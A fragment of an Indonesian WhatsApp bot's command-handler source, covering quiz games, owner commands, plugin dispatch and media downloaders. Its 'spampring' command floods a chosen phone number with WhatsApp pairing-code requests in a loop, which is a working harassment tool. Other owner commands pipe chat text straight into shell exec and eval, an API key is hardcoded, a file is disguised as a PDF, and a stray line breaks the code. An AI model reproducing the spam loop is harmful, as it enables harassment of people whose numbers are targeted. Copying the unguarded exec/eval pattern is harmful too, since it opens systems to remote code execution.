Exp : +999
Bonus : +${poin} Balance`.trim())
hanz.tebakgambar[id] = [
hanz.sendImage(from, json.img , teks, m),
json,
setTimeout(async () => {
if (hanz.tebakgambar[id])
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebakgambar[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
case 'siapaaku':
case 'siapakahaku':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat
if (id in hanz.siapaaku) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Balance`.trim()
hanz.siapaaku[id] = [
await setReply(caption),
json, poin,
setTimeout(async () => {
if (hanz.siapaaku[id]) 
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.siapaaku[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
case 'family100': {
if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let winScore = 1000
let id = m.chat
if (id in hanz.family) return reply('Masih ada kuis yang belum terjawab di chat ini') 
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Terdapat *${json.jawaban.length}* jawaban${json.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}

+${winScore} Money tiap jawaban benar
`.trim())
hanz.family[id] = {
id,
msg: await m.reply(caption),
...json,
terjawab: Array.from(json.jawaban, () => false),
winScore,
}
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
 // ========= FITUR STORAGE =========//
  
 // ========= FITUR SETTINGS ========//

 // ========== FITUR OWNER =========== //

case 'spampring': {
if (!isOwner) return onlyOwner();
if (!q) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply('otewekan')
let [peenis, pepekk = "200"] = q.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
case 'getcase': {
    try {
        if (!isOwner && !itsMe) return onlyOwner();
        if (!q) return setReply("*Mau nyari Case apa kak*");
        if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");
        let nana = await getCase(q);
let nana1 = `${gris1} ${nana} ${gris1}`
  reply(nana1)

    } catch (err) {
        console.log(err);
        setReply(`Case ${q} tidak ditemukan`);
    }
}
break;

case 'setppbot':
if (!isOwner) return setReply(mess.only.owner)
let { S_WHATSAPP_NET } = require("baileys") 
const media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
const { img } = await generateProfilePicture(media)
await hanz.query({ tag: 'iq',attrs: { to: S_WHATSAPP_NET, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]}) 
await setReply("Sukses")
break

testai
case 'addcase': {
    if (!isOwner) return onlyOwner();
    if (!q) return setReply('Penggunaan salah. Silakan ketik `addcase Fitur` yang ingin ditambahkan.');
    const namaFile = './message/case.js';
    const caseBaru = `${q}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const posisiAwalGimage = data.indexOf("case 'addcase':");
        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    setReply('Error File: ' + err); 
                } else {
                    setReply('Sukses Menambahkan case'); 
                }
            });
        } else {
            setReply('Gagal Menambahkan case'); 
        }
    });
}
break;

case 'delcase': {
    if (!isOwner) return onlyOwner();
    if (!q) return setReply('Penggunaan salah. Silakan ketik `delcase Fitur` yang ingin dihapus.');
    const namaFile = './message/case.js';
    const caseToDelete = `case '${q}':`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return setReply('Terjadi kesalahan saat membaca file.'); // Mengganti 'reply' menjadi 'setReply'
        }
        const posisiCase = data.indexOf(caseToDelete);
        if (posisiCase === -1) {
            return setReply(` case ${q} tidak ditemukan dalam file.`); // Mengganti 'args' menjadi 'text' untuk konsistensi
        }
        const posisiBreak = data.indexOf('break;', posisiCase);
        if (posisiBreak === -1) {
            return setReply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.'); // Mengganti 'reply' menjadi 'setReply'
        }
        const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return setReply('Terjadi kesalahan saat menulis file.'); 
            } else {
                return setReply(`Case '${q}' berhasil dihapus.`); 
            }
        });
    });
}
break;

case 'listcase': {
setReply(listCase())
}
break
case 'sendcase':
try {
    if (!isOwner && !itsMe) return onlyOwner();
    if (!q) return setReply("*Mau kirim Case apa kak?*");
    let who;
    try {
        if (m.isGroup) {
            who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
        } else {
            who = m.sender; 
        }
    } catch (err) {
        if (m.isGroup) {
            who = args[0] + '@s.whatsapp.net'; 
        } else {
            who = m.sender; 
        }
    }
    if (!who) return setReply(`Tag atau nomor tidak ditemukan!`);
    if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");
    let caseData = await getCase(q);
    if (!caseData) return setReply(`Case ${q} tidak ditemukan`);
  let kirCas = `${gris}Hai Kak Ada Kiriman case Dari Owner Ku Nih${gris} \n\n ${caseData}`
    await hanz.sendMessage(who, { text: kirCas });
    setReply(`Case "${q}" berhasil dikirim ke ${who}`);
} catch (err) {
    console.log(err);
    setReply(`Case ${q} tidak ditemukan atau terjadi kesalahan`);
}
break;
case 'getfunc':
    if (!isOwner) return onlyOwner()
    if (!q) return reply(`Contoh penggunaan: ${prefix + command} onlyLimit`); 
    const getfunc = (funcc) => {
        const fileContent = fs.readFileSync('./message/case.js', 'utf8'); 
        const functionRegex = new RegExp(`const ${funcc} = (.*?)};`, 's');
        const match = fileContent.match(functionRegex);
        return match ? match[0] : `Function ${funcc} tidak ditemukan.`; 
    };

    reply(`${getfunc(q)}`); 
    break; 
case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`*>_ Console*\n\n${stdout}`)
}
})
}
break
case '>': {
if (!isOwner) return onlyOwner()
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
break
// =========== MAIN MENU ==========//

//============= BATAS COMMAND ==============//
    

default:
    
        
 //--------PLUGINS-------\\
let usedPrefix
let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
const ___dirname = path.join(__dirname, './plugins')
for (let name in global.plugins) {
let plugin = global.plugins[name]
if (!plugin)
continue
if (plugin.disabled)
continue
const __filename = join(___dirname, name)
if (typeof plugin.all === 'function') {
try {
await plugin.all.call(hanz, m, {
chatUpdate,
__dirname: ___dirname,
__filename
})
} catch (e) {
console.error(e)
}
}


const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
let _prefix = plugin.customPrefix ? plugin.customPrefix: prefix
let match = (_prefix instanceof RegExp ? // RegExp Mode?
[[_prefix.exec(m.text), _prefix]]:
Array.isArray(_prefix) ? // Array?
_prefix.map(p => {
let re = p instanceof RegExp ? // RegExp in Array?
p:
new RegExp(str2Regex(p))
return [re.exec(m.text), re]
}):
typeof _prefix === 'string' ? // String?
[[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]]:
[[[], new RegExp]]
).find(p => p[1])

if (typeof plugin.before === 'function') {
if (await plugin.before.call(hanz, m, {
thePrefix,
store,
isAccept,
command,
args,
q,
match,
hanz,
prefix,
setReply,
reply,
sendSticker,
sendvn,
sendMusic,
sendThumb,
sendReact,
otw,
from,
budy,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin ,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isprems: isPremium,
isResPanel,
chatUpdate,
__dirname: ___dirname,
__filename
}))
continue
}

if (typeof plugin !== 'function')
continue

let fail = plugin.fail || global.dfail 
usedPrefix = (match[0] || '')[0]||prefix



if (command || usedPrefix ) {

let noPrefix = m.body.replace(usedPrefix, '')
let _args = noPrefix.trim().split` `.slice(1)
let text = q 
var isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
plugin.command.test(command):
Array.isArray(plugin.command) ? // Array?
plugin.command.some(cmd => cmd instanceof RegExp ? // RegExp in Array?
cmd.test(command) : cmd === command) : typeof plugin.command === 'string' ? // String?
plugin.command === command : false

if (!isAccept) continue


m.plugin = name
if (plugin.rowner && plugin.owner && !(isOwner)) {
return onlyOwner()
break
}
if (plugin.owner && !isOwner) {
return onlyOwner()
break
}  
if (plugin.premium && !isPremium) {
return onlyPrem()
break
}

if (plugin.group && !m.isGroup) {
return onlyToko()
break
}
if (plugin.selerpanel && !isResPanel) {
fail('selerpanel')
break
}
if (plugin.gcStore) {
    if (m.isGroup && m.chat === global.idGcStore) {
const menuToko = async() => {
    let twknya = `${menutoko(prefix)}`;   sendReact('📂');
    hanz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
           fileName: pushname,
           fileLength: 99999999999999,
            mimetype: 'application/pdf',
     jpegThumbnail:fs.readFileSync("./stik/docStore.jpg"),
            caption: twknya,
  contextInfo: {
       showAdAttribution: true,
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `6281260431003@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId:null,
            newsletterName: nameToko
        }
    }
}, { quoted: m,ephemeralExpiration: 86400});
}
return menuToko();
break
 }
} else if (plugin.onlyGroup && !m.isGroup) {
return;
break
} else if ( plugin.cmdStore &&  !(m.chat === idGcStore || !m.isGroup) ) {   return m.reply('Command Hanya Bisa Di Akses Di Group Store Dan Private')
                                             break                            
} else if (plugin.noCmdStore && m.chat === global.idGcStore) {
  return m.reply(`Fitur Tidak Dapat Di Gunakan Dalam Group ${groupName}`)
break
} else if (plugin.nsfw && !isAntiNsfw) {
setReply(mess.nsfw)
break
} else if (plugin.botAdmin && !m.isBotAdmin) {
return onlyBadmin()
break
} else if (plugin.admin && !m.isAdmin) {
return onlyAdmin()
break
}
if (plugin.private && m.isGroup) {
return onlyPrivate()
break
}
if (plugin.register && !_user.registered) {
return sendDaftar()
break
}
if (plugin.onlyprem && !m.isGroup && !isPremium) {
return onlyPrem()
break
}
if (plugin.rpg && m.isGroup && !global.db.data.chats[m.chat].rpg) {
fail('rpg')
break
}
if (plugin.game && m.isGroup && !global.db.data.chats[m.chat].game) {
 replyDoc(mess.game)
    break;
}

if (plugin.limit && !isPremium && _user.limit < plugin.limit * 1) {
    return onlyLimit()
}

if (plugin.limit && !isPremium && q ) {
    _user.limit -= 1; 
   reply('✅ 1 limit terpakai'); // Memberi tahu pengguna bahwa 1 limit telah terpakai
}


if (user && plugin.level > _user.level) {
hanz.reply(m.chat, `[💬] Mohon maaf level yang di perlukan untuk menggunakan fitur ini ${plugin.level}\n*Level mu:* ${_user.level} 📊`, m, {
contextInfo: {
externalAdReply: {
title: pushname, body: 'Akses Di Tolak', sourceUrl: syt, thumbnail:fs.readFileSync('./stik/menhera.jpg')
}
}
})
break
}
if (user && plugin.age > _user.age) {
hanz.reply(m.chat, `[💬] Umurmu harus diatas ${plugin.age} Tahun untuk menggunakan fitur ini...`, m, {
contextInfo: {
externalAdReply: {
title: pushname
, body: 'Akses Di Tolak', sourceUrl: web, thumbnail: fs.readFileSync('./stik/menhera.jpg')
}
}
})
break
}



let extra = {
setReply,
reply,
replyDoc,
sendSticker,
sendAnti,
sendvn,
dmusic,
sendReact,
sendMusic,
sendThumb,
onlyOwner,
onlyAdmin,
onlyBadmin,
onlyPrem,
onlyLimit,
onlyGlimit,
onlyPrivate,
onlyToko,
ucapanWaktu,
otw,
store,
isAccept,
q,
prefix,
usedPrefix,
noPrefix,
args,
command,
text,
from,
budy,
hanz,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isResPanel,
isprems: isPremium,
chatUpdate,
__dirname: ___dirname,
__filename
}

try {
await plugin.call(hanz, m, extra)
} catch (err) {

if(err.message !== undefined){
  let e = util.format(err);
  await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, m) 
  if (isCmd) Failed(toFirstCase(command), dash)
  if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
  }

  

await sleep(2000)
m.reply(`*🗂️ Plugin:* ${m.plugin}\n*👤 Sender:* ${m.sender}\n*💬 Chat:* ${m.chat}\n*💻 Command:* ${usedPrefix}${command} ${args.join(' ')}\n📄 *Error Logs:*\n\n\ ${e}`.trim(), nomerOwner+"@s.whatsapp.net")
} else {
  //log(err)
  let e = util.format(err)
  m.reply(`${e}`)

}

} finally {

if (typeof plugin.after === 'function') {
try {
await plugin.after.call(hanz, m, extra)
} catch (e) {
console.error(e)
}
}

}
break
}


}//akhir dari name in global plugins      
 

if ( autoDetectCmd ) {
if (!isGroup) return;
  if (isCmd && !isAccept) {
    await Nothing(toFirstCase(command), dash, allcommand);

    const stringSimilarity = require("string-similarity");
    let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand);

setReply(`command *${prefix + command}* tidak ditemukan\nmungkin yang kamu maksud adalah *${prefix + matches.bestMatch.target.toLowerCase()}*`);
  }
}} // Akhir switch command


// Auto Download Video TikTok
if (budy.startsWith('https://vt.tiktok.com/') || 
    budy.startsWith('https://www.tiktok.com/') || 
    budy.startsWith('https://vm.tiktok.com/')) {
    try {
        let res = await fetch(`https://skizoasia.xyz/api/tiktok?url=${budy}&apikey=Rangelofficial`);
        let json = await res.json();
        let fbk = `*🎵 乂 Tiktok Downloader 🎵*\n\n` +
                  `👤 *Nama:* ${json.data.author.nickname}\n` +
                  `🆔 *Nickname:* @${json.data.author.unique_id}\n` +
                  `📅 *ID:* ${json.data.id}\n` +
                  `📝 *Deskripsi:* ${json.data.title}`;
        await hanz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        await hanz.sendMessage(m.chat, { video: { url: json.data.play }, caption: fbk }, { quoted: m });
    } catch (err) {
        console.log(err);
    }
}

if (budy.startsWith("https://www.instagram.com/reel/") || budy.startsWith("https://www.instagram.com/p/")) {
    try {
        let res = await fetchJson(`https://skizoasia.xyz/api/instagram?apikey=Rangelofficial&url=${budy}}`);
        await hanz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        for (let i of res.media) {
            await sleep(100); 
            await hanz.sendMessage(m.chat, { video: { url: i }, caption: `*乂 Instagram Downloader*\n\n${res.caption}` }, { quoted: m });
        }
    } catch (err) { 
        m.reply(err); 
    }
}


    
        


/*/User Private Chat
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user && isPremium && !itsMe) {
reply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}*/
//Jika ada yg panggil bot
if (katabot.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(halo)
}
//Jika ada yg lopyu
if (katalopyu.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(lopyoutoo)
}
//Jika ada yang bilang ohayo pagi bot akan merespon✓
if(ohayo.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Hadeuh sekarang udah ga pagi kak") 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(pagi)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Hadeuh sekarang udah ga malem kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(malam)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang koniciwa siang bot akan merespon✓
if(katasiang.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '00:00')  return setReply("Hadeuh sekarang udah ga siang kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
 sendvn(siang)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yg ucap salam bot akan merespon   
if (budy.startsWith('Assalamualaikum') || budy.startsWith(`Assalamu'alaikum`) || budy.startsWith('assalamualaikum')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(walaikumsalam)
}
//Jika ada yg ucap salam bot akan merespon   
if (budy.startsWith('SALKEN') || budy.startsWith('salken')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
m.reply(`salam kenal juga ${pushname}`)
}
//Jika ada yg ara bot✓
if (katara.includes(budy)) {		
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(wibu)
}
//JIKA ADA YANG TAG NOMOR OWNER 
if (isGroup && budy.includes(`${devoloper1}`)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
//sendSticker(TagOwner)
const kta = ['ɪʏᴀ ᴋᴀᴋ ɪᴛᴜ ɴᴏᴍᴇʀ ᴏᴡɴᴇʀ ᴀᴋᴜ ᴀᴅᴀ ᴀᴘᴀ ʏᴀ??\n','ᴊɪᴋᴀ ᴀᴅᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪᴛᴀɴʏᴀᴋᴀɴ sɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ʏᴀ ᴋᴋ\n','ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʏᴀ ᴋᴋ!!\n']
const su = kta[Math.floor(Math.random() * kta.length)]
hanz.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: false,
groupMentions: [
{
groupJid: m.chat,
groupSubject: su,
}
]
}
},{quoted:m}
)
 
}   
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let teks = dada(prefix, pushname, ucapanWaktu)      
reply (teks)
}


//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
conn.sendMessage(from,{text:  `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`}, { quoted: m })
 }
//Jika ada yg toxic botz akan merespon✓
if (bad.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(astaga)

}   


} catch (err){
  Log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan install terlebih dahulu`
return await hanz.sendText(m.key.remoteJid, teks, m)
}
await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake}`, m) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 

  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await hanz.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]─── 「 Laporan Bug ⚠️」 ───[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

hanz.sendText(Ownerin, teks, m)

/*if(!autoblockcmd){
await hanz.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}*/

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
await hanz.sendMedia (Ownerin, media, m, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
hanz.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
  })